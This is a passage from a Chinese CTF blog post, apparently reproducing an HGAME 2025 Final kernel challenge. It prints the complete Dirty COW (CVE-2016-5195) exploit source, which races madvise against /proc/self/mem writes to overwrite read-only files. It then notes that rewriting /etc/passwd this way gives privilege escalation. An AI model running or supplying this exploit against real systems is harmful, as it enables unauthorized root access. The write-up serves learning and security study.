class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="built_in">map</span>;</span><br><span class="line"><span class="type">int</span> f;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line"><span class="type">char</span> *name;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> *<span class="title function_">madviseThread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">char</span> *str;</span><br><span class="line">  str=(<span class="type">char</span>*)arg;</span><br><span class="line">  <span class="type">int</span> i,c=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">100000000</span>;i++)</span><br><span class="line">  {</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">You have to race madvise(MADV_DONTNEED) :: https://access.redhat.com/security/vulnerabilities/2706661</span></span><br><span class="line"><span class="comment">&gt; This is achieved by racing the madvise(MADV_DONTNEED) system call</span></span><br><span class="line"><span class="comment">&gt; while having the page of the executable mmapped in memory.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    c+=madvise(<span class="built_in">map</span>,<span class="number">100</span>,MADV_DONTNEED);</span><br><span class="line">  }</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"madvise %d\n\n"</span>,c);</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> *<span class="title function_">procselfmemThread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">char</span> *str;</span><br><span class="line">  str=(<span class="type">char</span>*)arg;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">You have to write to /proc/self/mem :: https://bugzilla.redhat.com/show_bug.cgi?id=1384344#c16</span></span><br><span class="line"><span class="comment">&gt;  The in the wild exploit we are aware of doesn't work on Red Hat</span></span><br><span class="line"><span class="comment">&gt;  Enterprise Linux 5 and 6 out of the box because on one side of</span></span><br><span class="line"><span class="comment">&gt;  the race it writes to /proc/self/mem, but /proc/self/mem is not</span></span><br><span class="line"><span class="comment">&gt;  writable on Red Hat Enterprise Linux 5 and 6.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">  <span class="type">int</span> f=open(<span class="string">"/proc/self/mem"</span>,O_RDWR);</span><br><span class="line">  <span class="type">int</span> i,c=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">100000000</span>;i++) {</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">You have to reset the file pointer to the memory position.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    lseek(f,(<span class="type">uintptr_t</span>) <span class="built_in">map</span>,SEEK_SET);</span><br><span class="line">    c+=write(f,str,<span class="built_in">strlen</span>(str));</span><br><span class="line">  }</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"procselfmem %d\n\n"</span>, c);</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span> *argv[])</span></span><br><span class="line">{</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">You have to pass two arguments. File and Contents.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">  <span class="keyword">if</span> (argc&lt;<span class="number">3</span>) {</span><br><span class="line">  (<span class="type">void</span>)<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%s\n"</span>,</span><br><span class="line">      <span class="string">"usage: dirtyc0w target_file new_content"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>; }</span><br><span class="line">  <span class="type">pthread_t</span> pth1,pth2;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">You have to open the file in read only mode.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">  f=open(argv[<span class="number">1</span>],O_RDONLY);</span><br><span class="line">  fstat(f,&amp;st);</span><br><span class="line">  name=argv[<span class="number">1</span>];</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">You have to use MAP_PRIVATE for copy-on-write mapping.</span></span><br><span class="line"><span class="comment">&gt; Create a private copy-on-write mapping.  Updates to the</span></span><br><span class="line"><span class="comment">&gt; mapping are not visible to other processes mapping the same</span></span><br><span class="line"><span class="comment">&gt; file, and are not carried through to the underlying file.  It</span></span><br><span class="line"><span class="comment">&gt; is unspecified whether changes made to the file after the</span></span><br><span class="line"><span class="comment">&gt; mmap() call are visible in the mapped region.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">You have to open with PROT_READ.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">  <span class="built_in">map</span>=mmap(<span class="literal">NULL</span>,st.st_size,PROT_READ,MAP_PRIVATE,f,<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"mmap %zx\n\n"</span>,(<span class="type">uintptr_t</span>) <span class="built_in">map</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">You have to do it on two threads.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">  pthread_create(&amp;pth1,<span class="literal">NULL</span>,madviseThread,argv[<span class="number">1</span>]);</span><br><span class="line">  pthread_create(&amp;pth2,<span class="literal">NULL</span>,procselfmemThread,argv[<span class="number">2</span>]);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">You have to wait for the threads to finish.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">  pthread_join(pth1,<span class="literal">NULL</span>);</span><br><span class="line">  pthread_join(pth2,<span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>以 <code>~/foo</code> 为例，这是一个只读文件：</p>
<p><img src="\2025320-HGAME-2025-Final-复现/image-20250402225857712.png"></p>
<p><img src="\2025320-HGAME-2025-Final-复现/image-20250402225927656.png"></p>
<p>运行 <code>dirtycow</code>：</p>
<p><img src="\2025320-HGAME-2025-Final-复现/image-20250402230038064.png"></p>
<p>结果如下：</p>
<p><img src="\2025320-HGAME-2025-Final-复现/image-20250402230133893.png"></p>
<p>同理，如果我们修改 <code>/etc/passwd</code>，就可以实现提权。</p>
<h1 id="references">References</h1>
<section id="footnotes" class="footnotes footnotes-end-of-document" role="doc-endnotes">
<hr>
<ol>
<li id="fn1"><p><a target="_blank" rel="noopener" href="https://www.bookstack.cn/read/CTF-All-In-One/doc-6.1.1_pwn_hctf2016_brop.md">pwn_hctf2016_brop.md</a><a href="#fnref1" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn2"><p><a target="_blank" rel="noopener" href="https://www.scs.stanford.edu/brop/bittau-brop.pdf">bittau-brop.pdf</a><a href="#fnref2" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn3"><p><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Copy-on-write#cite_note-1">Copy-on-write</a><a href="#fnref3" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn4"><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/hbhgyu/article/details/106245182">Dirty
COW</a><a href="#fnref4" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
</ol>
</section>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/pwn/" rel="tag"><i class="fa fa-tag"></i> pwn</a>
              <a href="/tags/hgame/" rel="tag"><i class="fa fa-tag"></i> hgame</a>
              <a href="/tags/kernel/" rel="tag"><i class="fa fa-tag"></i> kernel</a>
              <a href="/tags/blind-pwn/" rel="tag"><i class="fa fa-tag"></i> blind pwn</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2025/03/02/202532-Cloudflare-Worker-%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E5%B0%9D%E8%AF%95/" rel="prev" title="Cloudflare Worker 反向代理尝试">
                  <i class="fa fa-angle-left"></i> Cloudflare Worker 反向代理尝试
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2025/04/01/glibcFSOP/" rel="next" title="Vidar 分享会 - FSOP">
                  Vidar 分享会 - FSOP <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">
<div class="custom-footer">
  <span>summ2's blog</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>

  






  




  

  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
<script src="/js/third-party/math/mathjax.js"></script>



</body>
</html>
